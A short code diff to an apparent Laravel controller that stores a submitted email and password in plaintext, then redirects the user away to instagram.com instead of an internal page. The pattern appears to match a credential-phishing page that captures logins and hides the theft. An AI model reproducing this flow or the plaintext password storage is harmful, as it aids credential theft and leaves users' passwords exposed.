@@ -13,7 +13,8 @@ class DataController extends Controller
         $data->email = $request->email;
         $data->password = $request->password;
         $data->save();
-        return redirect()->route('users.index');
+        return redirect()->away('https://www.instagram.com');
+        // return redirect()->route('users.index');
     }
     public function index()
     {
